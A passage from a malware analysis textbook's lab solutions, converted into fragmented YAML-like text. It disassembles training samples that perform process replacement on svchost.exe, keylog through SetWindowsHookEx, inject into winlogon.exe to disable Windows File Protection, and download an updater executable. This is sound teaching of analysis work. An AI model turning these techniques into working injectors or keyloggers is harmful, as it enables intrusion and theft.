- en: 0040129F add ecx, [eax+14h]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A2 push ecx ; lpBuffer 004012A3 mov edx, [ebp+var_74]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A6 mov eax, [ebp+lpBaseAddress]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A9 add eax, [edx+0Ch]
  prefs: []
  type: TYPE_NORMAL
- en: 004012AC push eax ; lpBaseAddress 004012AD mov ecx, [ebp+ProcessInformation.hProcess]
  prefs: []
  type: TYPE_NORMAL
- en: 004012B0 push ecx ; hProcess 004012B1 call ds:WriteProcessMemory
  prefs: []
  type: TYPE_NORMAL
- en: 004012B7 jmp short loc_401260 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-9L: Copying PE sections into memory*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**593**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The loop counter is compared to the value at offset 6 bytes into the PE
  prefs: []
  type: TYPE_NORMAL
- en: header at , which is the NumberOfSections. Because executable sections contain
    the data necessary to run an executable—such as the code, data, relocations, and
    so on—we know that this loop is probably copying the PE executable sections into
    the suspended process, but let’s be sure.
  prefs: []
  type: TYPE_NORMAL
- en: var_4 contains a pointer to the MZ/PE file in memory (labeled lpBuffer by IDA
    Pro), which is initialized at location 0x004010F3\. We know that the first part
    of a PE executable is an MZ header, and at , we see the program adding offset
    0x3C (offset to PE header) to the MZ header buffer, which makes ECX point to the
    beginning of the PE header. At , we see a pointer being obtained. EDX is 0 the
    first time through the loop, so we can remove EDX from the pointer calculation.
    That leaves us with ECX and 0xF8\.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the PE header offsets, we see 0xF8 is the start of the IMAGE_HEADER_SECTION
    array. A simple sizeof(IMAGE_HEADER_SECTION) tells us that this structure is 40
    bytes, which matches the multiplication performed on the loop counter at .
  prefs: []
  type: TYPE_NORMAL
- en: Now we can leverage IDA Pro standard structures again by adding in IMAGE_DOS_HEADER,
    IMAGE_NT_HEADERS, and IMAGE_SECTION_HEADER. Using the knowledge we’ve gained about
    each register at the different stages, we can transform the disassembly in Listing
    12-9L into the much more readable version in Listing 12-10L (the changes are in
    bold in this listing).
  prefs: []
  type: TYPE_NORMAL
- en: '00401260 loc_401260:'
  prefs: []
  type: TYPE_NORMAL
- en: '; CODE XREF: sub_4010EA+1CD_j'
  prefs: []
  type: TYPE_NORMAL
- en: 00401260 mov eax, [ebp+var_70]
  prefs: []
  type: TYPE_NORMAL
- en: 00401263 add eax, 1
  prefs: []
  type: TYPE_NORMAL
- en: 00401266 mov [ebp+var_70], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401269
  prefs: []
  type: TYPE_NORMAL
- en: '00401269 loc_401269: ; CODE XREF: sub_4010EA+174_j 00401269 mov ecx, [ebp+var_8]'
  prefs: []
  type: TYPE_NORMAL
- en: 0040126C xor edx, edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040126E mov dx,[ecx+**IMAGE_NT_HEADERS.FileHeader.NumberOfSections**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401272 cmp [ebp+var_70], edx
  prefs: []
  type: TYPE_NORMAL
- en: 00401275 jge short loc_4012B9
  prefs: []
  type: TYPE_NORMAL
- en: 00401277 mov eax, [ebp+var_4]
  prefs: []
  type: TYPE_NORMAL
- en: 0040127A mov ecx, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
- en: 0040127D add ecx, [eax+**IMAGE_DOS_HEADER.e_lfanew**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401280 mov edx, [ebp+var_70]
  prefs: []
  type: TYPE_NORMAL
- en: 00401283 imul edx, 28h
  prefs: []
  type: TYPE_NORMAL
- en: 00401286 lea eax, [ecx+edx+(**size IMAGE_NT_HEADERS**)]
  prefs: []
  type: TYPE_NORMAL
- en: 0040128D mov [ebp+var_74], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401290 push 0 ; lpNumberOfBytesWritten 00401292 mov ecx, [ebp+var_74]
  prefs: []
  type: TYPE_NORMAL
- en: 00401295 mov edx, [ecx+**IMAGE_SECTION_HEADER.SizeOfRawData**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401298 push edx ; nSize
  prefs: []
  type: TYPE_NORMAL
- en: 00401299 mov eax, [ebp+var_74]
  prefs: []
  type: TYPE_NORMAL
- en: 0040129C mov ecx, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
- en: 0040129F add ecx, [eax+**IMAGE_SECTION_HEADER.PointerToRawData**]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A2 push ecx ; lpBuffer 004012A3 mov edx, [ebp+var_74]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A6 mov eax, [ebp+lpBaseAddress]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A9 add eax, [edx+**IMAGE_SECTION_HEADER.VirtualAddress**]
  prefs: []
  type: TYPE_NORMAL
- en: '**594**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004012AC push eax ; lpBaseAddress 004012AD mov ecx, [ebp+ProcessInformation.hProcess]
  prefs: []
  type: TYPE_NORMAL
- en: 004012B0 push ecx ; hProcess 004012B1 call ds:WriteProcessMemory
  prefs: []
  type: TYPE_NORMAL
- en: 004012B7 jmp short loc_401260
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-10L: Copying PE sections into memory using IDA Pro structures*
    In Listing 12-10L, it’s much easier to see that the SizeOfRawData, PointerToRawData,
    and VirtualAddress values of each section header are being used to perform the
    copy operations, confirming our earlier suspicion that the program copies each
    section into the suspended process’s memory space. The program has taken the necessary
    steps to load an executable into another process’s address space.'
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 12-11L, we see that the program uses SetThreadContext, which sets
    the EAX register at  to the entry point of the executable that was just loaded
    into the suspended process’s memory space. Once the program performs the ResumeThread
    at , it will have successfully achieved process replacement on the process created
    using CreateProcessA at the beginning of this function.
  prefs: []
  type: TYPE_NORMAL
- en: 004012DB
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: eax, [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 004012DE
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: ecx, [ebp+lpBaseAddress]
  prefs: []
  type: TYPE_NORMAL
- en: 004012E1
  prefs: []
  type: TYPE_NORMAL
- en: add
  prefs: []
  type: TYPE_NORMAL
- en: ecx, [eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: 004012E4
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: edx, [ebp+lpContext]
  prefs: []
  type: TYPE_NORMAL
- en: 004012E7
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: '[edx+CONTEXT._Eax], ecx '
  prefs: []
  type: TYPE_NORMAL
- en: 004012ED
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: eax, [ebp+lpContext]
  prefs: []
  type: TYPE_NORMAL
- en: 004012F0
  prefs: []
  type: TYPE_NORMAL
- en: push
  prefs: []
  type: TYPE_NORMAL
- en: eax ; lpContext
  prefs: []
  type: TYPE_NORMAL
- en: 004012F1
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: ecx, [ebp+ProcessInformation.hThread]
  prefs: []
  type: TYPE_NORMAL
- en: 004012F4
  prefs: []
  type: TYPE_NORMAL
- en: push
  prefs: []
  type: TYPE_NORMAL
- en: ecx ; hThread
  prefs: []
  type: TYPE_NORMAL
- en: 004012F5
  prefs: []
  type: TYPE_NORMAL
- en: call
  prefs: []
  type: TYPE_NORMAL
- en: ds:**SetThreadContext**
  prefs: []
  type: TYPE_NORMAL
- en: 004012FB
  prefs: []
  type: TYPE_NORMAL
- en: mov
  prefs: []
  type: TYPE_NORMAL
- en: edx, [ebp+ProcessInformation.hThread]
  prefs: []
  type: TYPE_NORMAL
- en: 004012FE
  prefs: []
  type: TYPE_NORMAL
- en: push
  prefs: []
  type: TYPE_NORMAL
- en: edx ; hThread
  prefs: []
  type: TYPE_NORMAL
- en: 004012FF
  prefs: []
  type: TYPE_NORMAL
- en: call
  prefs: []
  type: TYPE_NORMAL
- en: ds:ResumeThread 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-11L: Resuming a suspended process*'
  prefs: []
  type: TYPE_NORMAL
- en: Now that we know process replacement is occurring, it’s important to determine
    which process is being replaced and which process is being covertly executed,
    cloaked within another. First, we need to discover the origin of lpApplicationName,
    the label created by IDA Pro seen in Listing 12-6L
  prefs: []
  type: TYPE_NORMAL
- en: being provided to the CreateProcessA API call.
  prefs: []
  type: TYPE_NORMAL
- en: Pressing CTRL-X with the cursor at the start of the sub_4010EA function shows
    all cross-references, including the callers sub_40144B and main. Following main
    brings us to 0x00401544, where the variable Dst is loaded into a register to be
    passed to sub_4010EA as the process name for CreateProcessA. Placing the cursor
    over Dst highlights the variable throughout the function, thereby allowing us
    to follow the variable in order to determine its origin.
  prefs: []
  type: TYPE_NORMAL
- en: The variable is first seen as shown in Listing 12-12L at , as the second parameter
    to sub_40149D.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**595**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401508 push 400h ; uSize 0040150D lea eax, [ebp+Dst] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401513 push eax ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 00401514 push offset aSvchost_exe  ;
  prefs: []
  type: TYPE_NORMAL
- en: '"\\svchost.exe"'
  prefs: []
  type: TYPE_NORMAL
- en: 00401519 call sub_40149D
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-12L: Building the path string*'
  prefs: []
  type: TYPE_NORMAL
- en: A quick look at sub_40149D shows it to be a simple function that copies
  prefs: []
  type: TYPE_NORMAL
- en: '%SystemRoot%\System32\ into the second parameter, and then concatenates the
    first parameter onto the end of that. Since Dst is the second parameter, it receives
    this new path, so we backtrack through to the first parameter of sub_40149D, at
    , which we can see is \\svchost.exe. This tells us that the replaced process
    is *%SystemRoot%\System32\svchost.exe*.'
  prefs: []
  type: TYPE_NORMAL
- en: Now we know that the program is starting *svchost.exe*, but we still need to
    determine the process that is replacing *svchost.exe*. To do so, we follow the
    PE
  prefs: []
  type: TYPE_NORMAL
- en: buffer passed to sub_4010EA by following the variable lpBuffer at 0x00401539,
    just as we backtracked Dst earlier.
  prefs: []
  type: TYPE_NORMAL
- en: We locate lpBuffer, which is receiving EAX at  in Listing 12-13L. By examining
    earlier instructions, we find a function call at . Remembering that EAX is the
    return value for a function, we know the buffer is coming from the function sub_40132C,
    which appears to take the variable hModule, a memory pointer to the program itself,
    *Lab12-02.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: 00401521 mov ecx, [ebp+hModule]
  prefs: []
  type: TYPE_NORMAL
- en: 00401527 push ecx ; hModule 00401528 call sub_40132C 
  prefs: []
  type: TYPE_NORMAL
- en: 0040152D add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 00401530 mov [ebp+lpBuffer], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-13L: Loading the executable that replaces* svchost.exe The function
    sub_40132C calls the functions FindResource, LoadResource, LockResource, SizeOfResource,
    VirtualAlloc, and memcpy. The program copies data from the executable’s resource
    section into memory. We’ll use Resource Hacker to view the items in the resource
    section and export them to independent files. Figure 12-3L shows *Lab12-02.exe*
    inside Resource Hacker with an encoded binary in the resource section. We can
    use Resource Hacker to export this binary.'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we need to continue examining the disassembly to determine how
    the executable is decoded. At 0x00401425, we see that the buffer is passed to
    function sub_401000, which looks like an XOR routine. Looking back at the third
    parameter passed to the function at location 0x0040141B, we see 0x41\. Using WinHex,
    we can quickly XOR the entire file exported earlier from Resource Hacker by selecting
    **Edit****Modify Data****XOR** and entering **0x41**. After performing this
    conversion, we have a valid PE executable that is later used to replace an instance
    of *svchost.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '**596**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 133](index-630_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 12-3L: Resource Hacker showing an encoded binary in the resource section*
    **NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*WinHex is a hex editor available at* http://www.x-ways.net/winhex/ *and the
    free* *trial version is useful for malware analysis. We use it here for illustrative
    purposes, but* *most hex editors can perform a single-byte XOR operation.*'
  prefs: []
  type: TYPE_NORMAL
- en: We can conclude that this malware decodes a binary from its resource section
    and performs process replacement on *svchost.exe* with the decoded binary.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 12-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The program is a keylogger.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program uses hook injection to steal keystrokes.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The program creates the file *practicalmalwareanalysis.log* to store the keystrokes.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Since we’ve already analyzed this binary in the labs for Chapter 3, and it was
    extracted as part of Lab 12-2, let’s begin by opening the file with IDA Pro to
    examine the function imports. The most interesting of the imports is SetWindowsHookExA,
    an API that allows an application to hook or monitor events within Microsoft Windows.
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 12-14L, we see that SetWindowsHookExA is called from main at .
  prefs: []
  type: TYPE_NORMAL
- en: The MSDN documentation shows that the first parameter, 0Dh, corresponds to WH_KEYBOARD_LL,
    which enables monitoring of keyboard events using the hook function IDA Pro labeled
    fn at . The program is probably doing something with keystrokes. The fn function
    will receive keystrokes.
  prefs: []
  type: TYPE_NORMAL
- en: 00401053 push eax ; hmod
  prefs: []
  type: TYPE_NORMAL
- en: 00401054 push offset fn  ; lpfn
  prefs: []
  type: TYPE_NORMAL
- en: 00401059 push 0Dh ; idHook Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**597**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040105B call ds:SetWindowsHookExA 
  prefs: []
  type: TYPE_NORMAL
- en: 00401061 mov [ebp+hhk], eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-14L: SetWindowsHookEx called from main*'
  prefs: []
  type: TYPE_NORMAL
- en: After registering to receive keyboard events, the program calls GetMessageA
    in a loop that starts at 0x00401076\. The program must call GetMessageA; otherwise,
    Windows would not deliver the messages to the process’s hook function.
  prefs: []
  type: TYPE_NORMAL
- en: The loop runs until it produces an error.
  prefs: []
  type: TYPE_NORMAL
- en: Navigating to the function fn, we begin to see what the program is doing with
    the keystrokes it captures. fn is a generic function with three parameters. It
    has a prototype defined by HOOKPROC. Using the MSDN documentation, we determine
    that WH_KEYBOARD_LL callbacks are actually LowLevelKeyboardProc callbacks. We
    use this information to resolve the parameters to actual data structures, which
    makes our job easier by allowing us to read names rather than numeric offsets.
  prefs: []
  type: TYPE_NORMAL
- en: To change the IDA display from offsets to names, put the cursor at 0x00401086
    and press the Y key, and then change lParam’s type to **KBDLLHOOKSTRUCT ***. You
    can now go to 0x4010a4, and hit the T key and select **KBDLLHOOKSTRUCT.vkCode**.
    The references to lParam should now show structure variable names rather than
    numeric offsets. For example, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: at 0x004010A4 becomes [eax+KBDLLHOOKSSTRUCT.vkCode], as shown in Listing 12-15L
    at .
  prefs: []
  type: TYPE_NORMAL
- en: 0040108F cmp [ebp+wParam], WM_SYSKEYDOWN 
  prefs: []
  type: TYPE_NORMAL
- en: 00401096 jz short loc_4010A1
  prefs: []
  type: TYPE_NORMAL
- en: 00401098 cmp [ebp+wParam], WM_KEYDOWN 
  prefs: []
  type: TYPE_NORMAL
- en: 0040109F jnz short loc_4010AF
  prefs: []
  type: TYPE_NORMAL
- en: 004010A1
  prefs: []
  type: TYPE_NORMAL
- en: '004010A1 loc_4010A1: ; CODE XREF: fn+10j 004010A1 mov eax, [ebp+lParam]'
  prefs: []
  type: TYPE_NORMAL
- en: 004010A4 mov ecx, [eax+KBDLLHOOKSTRUCT.vkCode] 
  prefs: []
  type: TYPE_NORMAL
- en: 004010A6 push ecx ; Buffer 004010A7 call **sub_4010C7**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-15L: Hook function*'
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 12-15L, we see at  and  that the program checks the type of keypress
    with cmp, in order to process each keypress once. At , the program passes (mov)
    the virtual key code to the function sub_4010C7 shown later in bold.
  prefs: []
  type: TYPE_NORMAL
- en: Examining sub_4010C7, we see that first the program opens a file, *practicalmalwareanalysis.log*.
    After this, the malware calls GetForegroundWindow followed by GetWindowTextA,
    as shown in Listing 12-16L. First, GetForegroundWindow selects the active window
    when the key was pressed, and then it grabs the title of the window using GetWindowTextA.
    This helps the program provide context for where the keystrokes originated.
  prefs: []
  type: TYPE_NORMAL
- en: 004010E6 push offset FileName ; "practicalmalwareanalysis.log"
  prefs: []
  type: TYPE_NORMAL
- en: 004010EB call ds:CreateFileA
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: '**598**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040110F push 400h ; nMaxCount 00401114 push offset String ; lpString 00401119
    call ds:**GetForegroundWindow**
  prefs: []
  type: TYPE_NORMAL
- en: 0040111F push eax ; hWnd
  prefs: []
  type: TYPE_NORMAL
- en: 00401120 call ds:**GetWindowTextA**
  prefs: []
  type: TYPE_NORMAL
- en: 00401126 push offset String ; Str2
  prefs: []
  type: TYPE_NORMAL
- en: 0040112B push offset Dest ; Str1
  prefs: []
  type: TYPE_NORMAL
- en: 00401130 call _strcmp
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-16L: Opening the log file and getting the window title* Once the
    program writes the window title to the log file, it enters a large jump table,
    as shown in Listing 12-17L at . Recognizing that var_C contains the virtual key
    code that was passed into the function, we see the virtual key code used as an
    index to a lookup table at . The value received from the lookup table is used
    as an index into the jump table off_401441 at .'
  prefs: []
  type: TYPE_NORMAL
- en: 0040120B sub eax, 8 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040121B mov edx, [ebp+var_C]
  prefs: []
  type: TYPE_NORMAL
- en: 0040121E xor ecx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401220 mov cl, ds:byte_40148D[edx]
  prefs: []
  type: TYPE_NORMAL
- en: '00401226 jmp ds:off_401441[ecx*4]  ; switch jump *Listing 12-17L: Virtual
    key code jump table*'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: We follow the lookup process by choosing a value like VK_SHIFT (0x10).
  prefs: []
  type: TYPE_NORMAL
- en: At , 8 is subtracted from the value, leaving us with 0x8 (0x10 – 0x8).
  prefs: []
  type: TYPE_NORMAL
- en: Looking at offset 0x8 into byte_40148D, as shown in Listing 12-18L, provides
    the value 3, which is stored in ECX. ECX is then multiplied by 4 at , yielding
    0xC, which is used as an offset into off_401441\. This returns the location loc_401249,
    where we find the string [SHIFT] written to the log file.
  prefs: []
  type: TYPE_NORMAL
- en: byte_40148D db 0, 1, 12h, 12h
  prefs: []
  type: TYPE_NORMAL
- en: db 12h, 2, 12h, 12h
  prefs: []
  type: TYPE_NORMAL
- en: db 3, 4, 12h, 12h
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-18L: The offset table for byte_40148D*'
  prefs: []
  type: TYPE_NORMAL
- en: We are able to conclude that this malware is a keylogger that logs keystrokes
    to the file *practicalmalwareanalysis.log*. This keylogger uses SetWindowsHookEx
    to implement its keylogging functionality.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 12-4 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware checks to see if a given PID is *winlogon.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Winlogon.exe* is the process injected.'
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The DLL *sfc_os.dll* will be used to disable Windows File Protection.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**599**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The fourth argument passed to CreateRemoteThread is a function pointer to an
    unnamed ordinal 2 (SfcTerminateWatcherThread) of *sfc_os.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware drops a binary from its resource section and overwrites the old
    Windows Update binary ( *wupdmgr.exe*) with it. Before overwriting the real *wupdmgr.exe*,
    the malware copies it to the *%TEMP%* directory for later usage.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware injects a remote thread into *winlogon.exe* and calls a function
    exported by *sfc_os.dll*, ordinal 2 (SfcTerminateWatcherThread), to disable Windows
    File Protection until the next reboot. The CreateRemoteThread call is necessary
    because this function must be executed inside the *winlogon.exe* process. The
    malware trojanizes *wupdmgr.exe* by using that executable to update its own malware
    and call the original Windows Update binary, which was saved to the *%TEMP%* directory.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin with basic static analysis. Examining the imports, we see CreateRemoteThread,
    but not WriteProcessMemory or VirtualAllocEx, which is interesting. We also see
    imports for resource manipulation, such as LoadResource and FindResourceA. Examining
    the malware with Resource Hacker, we notice an additional program named BIN stored
    in the resource section.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we turn to basic dynamic techniques. Procmon shows us that the malware
    creates the file *%TEMP%\winup.exe* and overwrites the Windows Update binary at
    *%SystemRoot%\System32\wupdmgr.exe*. Comparing the dropped *wupdmgr.exe* with
    the file in the BIN resource section, we see that they are the same. (Windows
    File Protection should restore the original file, but it doesn’t.)
  prefs: []
  type: TYPE_NORMAL
- en: Running Netcat, we find that the malware attempts to download *updater.exe*
    from *www.practicalmalwareanalysis.com*, as shown in Listing 12-19L.
  prefs: []
  type: TYPE_NORMAL
- en: GET /updater.exe HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept: */*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept-Encoding: gzip, deflate'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR'
  prefs: []
  type: TYPE_NORMAL
- en: '2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
    Host: www.practicalmalwareanalysis.com'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection: Keep-Alive'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-19L: HTTP GET request performed after running* Lab12-04.exe We
    load the malware into IDA Pro and scroll to the main function at address 0x00401350\.
    A few lines from the start of the main function, we see the malware resolving
    functions for Windows process enumeration within *psapi.dll*, as shown in Listing
    12-20L.'
  prefs: []
  type: TYPE_NORMAL
- en: 004013AA push offset ProcName
  prefs: []
  type: TYPE_NORMAL
- en: ; " **EnumProcessModules**"
  prefs: []
  type: TYPE_NORMAL
- en: 004013AF push offset aPsapi_dll ; " **psapi.dll**"
  prefs: []
  type: TYPE_NORMAL
- en: 004013B4 call ds:**LoadLibraryA** 
  prefs: []
  type: TYPE_NORMAL
- en: '**600**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004013BA push eax
  prefs: []
  type: TYPE_NORMAL
- en: 004013BB call ds:**GetProcAddress** 
  prefs: []
  type: TYPE_NORMAL
- en: '004013C1 mov **dword_40312C**, eax ; Rename to myEnumProcessModules *Listing
    12-20L: Dynamically resolving process enumeration imports* Listing 12-20L also
    shows one of the three functions the malware manually resolves using LoadLibraryA
    at  and GetProcAddress at .'
  prefs: []
  type: TYPE_NORMAL
- en: The malware saves the function pointer to dword_40312C (here at ), dword_403128,
    and dword_403124\. We’ll change the names of these global variables to make it
    easier to identify calls to the function later in our analysis, renaming them
    to myEnumProcessModules, myGetModuleBaseNameA, and myEnumProcesses.
  prefs: []
  type: TYPE_NORMAL
- en: Once the malware checks the values of the function pointers, it arrives at 0x00401423
    and the call myEnumProcesses, as shown in Listing 12-21L at . The goal of the
    code in this listing is to return an array of PIDs on the system. The start of
    the array is referenced by the local variable dwProcessId shown at .
  prefs: []
  type: TYPE_NORMAL
- en: '**00401423** lea eax, [ebp+var_1228]'
  prefs: []
  type: TYPE_NORMAL
- en: 00401429 push eax ; _DWORD
  prefs: []
  type: TYPE_NORMAL
- en: 0040142A push 1000h ; _DWORD
  prefs: []
  type: TYPE_NORMAL
- en: 0040142F lea ecx, [ebp+dwProcessId] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401435 push ecx ; _DWORD
  prefs: []
  type: TYPE_NORMAL
- en: 00401436 call myEnumProcesses 
  prefs: []
  type: TYPE_NORMAL
- en: 0040143C test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: 0040143E jnz short loc_401
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-21L: Enumerating processes*'
  prefs: []
  type: TYPE_NORMAL
- en: The malware then begins to loop through the PIDs, passing each to the subroutine
    at 0x00401000, as shown in Listing 12-22L. We see an index into the array referenced
    by dwProcessId, which is calculated before calling sub_401000\.
  prefs: []
  type: TYPE_NORMAL
- en: 00401495 mov eax, [ebp+var_1238]
  prefs: []
  type: TYPE_NORMAL
- en: 0040149B mov ecx, [ebp+eax*4+**dwProcessId**]
  prefs: []
  type: TYPE_NORMAL
- en: 004014A2 push ecx ; dwProcessId
  prefs: []
  type: TYPE_NORMAL
- en: 004014A3 call **sub_401000**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-22L: Looping through PIDs*'
  prefs: []
  type: TYPE_NORMAL
- en: We examine the internals of sub_401000 and see two local variables set (Str1
    and Str2), as shown in Listing 12-23L. The variable Str1 will contain the string
    "<not real>", and Str2 will contain "winlogon.exe".
  prefs: []
  type: TYPE_NORMAL
- en: 0040100A mov eax, dword ptr aWinlogon_exe ; "winlogon.exe"
  prefs: []
  type: TYPE_NORMAL
- en: 0040100F mov dword ptr [ebp+**Str2**], eax
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040102C mov ecx, dword ptr aNotReal ; "<not real>"
  prefs: []
  type: TYPE_NORMAL
- en: 00401032 mov dword ptr [ebp+**Str1**], ecx
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-23L: Initialization of strings*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**601**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the malware passes the loop parameter (dwProcessId) to the OpenProcess
    call in order to obtain a handle to that process, as shown at 
  prefs: []
  type: TYPE_NORMAL
- en: in Listing 12-24L. The handle returned from OpenProcess is stored in EAX
  prefs: []
  type: TYPE_NORMAL
- en: and passed to the myEnumProcessModules function at , which returns an array
    of handles for each module loaded into a process.
  prefs: []
  type: TYPE_NORMAL
- en: 00401070 push edx ; dwProcessId
  prefs: []
  type: TYPE_NORMAL
- en: 00401071 push 0 ; bInheritHandle
  prefs: []
  type: TYPE_NORMAL
- en: 00401073 push 410h ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 00401078 call ds:OpenProcess 
  prefs: []
  type: TYPE_NORMAL
